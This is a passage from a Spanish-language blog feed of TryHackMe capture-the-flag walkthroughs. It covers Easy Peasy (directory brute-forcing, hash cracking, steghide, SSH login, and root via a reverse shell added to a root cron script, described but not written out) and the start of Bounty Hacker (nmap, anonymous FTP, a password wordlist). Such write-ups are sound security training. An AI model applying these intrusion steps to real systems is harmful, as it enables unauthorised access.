&lt;p&gt;Ejecutamos rustbuster en este puerto al igual que en el puerto 80.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/easypeasy /opt/rustbuster/rustbuster dir -u http://easy.thm:65524/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t &lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; -e php,html,txt -o high_port.txt
~ rustbuster v3.0.3 ~ by phra &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ps1dr3x ~

         _     _                 _         _           _        _                 _         _           _           _     
        /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;  
       /  &lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt; / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; 
      / /&lt;span class=&#34;se&#34;&gt;\ \ \ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;
     / / /&lt;span class=&#34;se&#34;&gt;\ \_\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    / / /_/ / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; /_/_ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / / /_/ / /
   / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / / / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / /&lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ /____/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / 
  / / /_____/ / / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / / /  &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_// / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  / / /_____/  
 / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /____&lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;/ / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /______ / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   
/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /__________/ / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /_______/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;  
&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_____________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;__________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;   


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at	: 2020-08-05 01:14:24

GET	&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK				http://easy.thm:65524/
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://easy.thm:65524/.html
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://easy.thm:65524/index.html
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://easy.thm:65524/robots.txt
C^
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En &lt;code&gt;robots.txt&lt;/code&gt; encontramos un hash MD5, utilizamos &lt;a href=&#34;https://md5hashing.net&#34;&gt;&lt;strong&gt;md5hashing&lt;/strong&gt;&lt;/a&gt; para obtener el texto plano el cual es una flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154612.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Rustbuster no nos dio mas que errores, por lo que nos concentramos en el texto &amp;ldquo;codificado&amp;rdquo; que encontramos. Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para poder decodificar el texto. Encontramos que es posiblo utilizando base62, el cual nos devolvio lo que parece ser un directorio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154637.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos en este nuevo directorio lo que parece ser un hash SHA-256.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154707.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos nuevamente &lt;a href=&#34;https://md5hashing.net&#34;&gt;&lt;strong&gt;md5hashing&lt;/strong&gt;&lt;/a&gt; el cual nos mostró una &amp;ldquo;contraseña&amp;rdquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154738.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos la imagen de la pagina, utilizando &lt;code&gt;steghide&lt;/code&gt; y la contraseña que encontramos logramos encontrar un archivo que contiene codificado en binario un texto y el nombre de un usuario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154823.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuevamente con &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; logramos obtener el texto.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154847.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;boring---user&#34;&gt;BORING - USER&lt;/h2&gt;
&lt;p&gt;Con las credenciales que encontramos ingresamos por medio del servicio SSH de la maquina en el puerto 6498.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154919.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos nuestra flag &lt;code&gt;user.txt&lt;/code&gt; la cual esta &amp;lsquo;rotada&amp;rsquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154949.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;cat /etc/crontab&lt;/code&gt; y vemos cron que se ejecuta con el usuario root y que ejecuta el archivo &lt;code&gt;.mysecretcronjob.sh&lt;/code&gt; en &lt;code&gt;/var/www/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_155016.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El archivo no contiene ningun comando por lo que agregamos una shell inversa al archivo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_155045.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos netcat para esperar la conexion de nuestra shell, obtuvimos una shell con usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_155111.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/easypeasy_thm/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/easypeasy_thm/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Bounty Hacker</title>
        <link>https://sckull.github.io/posts/bountyhacker/</link>
        <pubDate>Wed, 29 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 29 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/bountyhacker/</guid>
        <description>Bounty Hacker es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Bounty Hacker es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/bountyhacker/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Bounty Hacker&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;150&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Sevuhl&#34;&gt;Sevuhl&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Aug  1 10:19:44 2020 as: nmap -sV -o nmap_scan_mini bountyhacker.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; bountyhacker.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.131.158&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.28s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;967&lt;/span&gt; filtered ports, &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Aug  1 10:20:09 2020 -- 1 IP address (1 host up) scanned in 24.80 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;En el puerto 21 FTP logramos ingresar como anonymous en donde encontramos dos archivos, uno que contiene lo que parece ser un wordlist, el segundo dos &amp;ldquo;tareas&amp;rdquo; y un posible nombre de usuario.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/bountyhacker# ftp bountyhacker.thm 
Connected to bountyhacker.thm.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bountyhacker.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
-rw-rw-r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;418&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;07&lt;/span&gt; 21:41 locks.txt
-rw-rw-r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp            &lt;span class=&#34;m&#34;&gt;68&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;07&lt;/span&gt; 21:47 task.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get locks.txt
local: locks.txt remote: locks.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; locks.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;418&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;418&lt;/span&gt; bytes received in 0.04 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.7433 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; get task.txt
local: task.txt remote: task.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; task.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;68&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;68&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;295.1389 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
root@upset:~/thm/bountyhacker# cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn&lt;span class=&#34;nv&#34;&gt;$yn9icat3&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

REd&lt;span class=&#34;nv&#34;&gt;$yNdIc47e&lt;/span&gt;
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
root@upset:~/thm/bountyhacker# cat task.txt 
1.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Protect Vicious.
2.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Plan &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Red Eye pickup on the moon.

-lin
root@upset:~/thm/bountyhacker#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/bountyhacker/Screenshot_20200801_093310.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
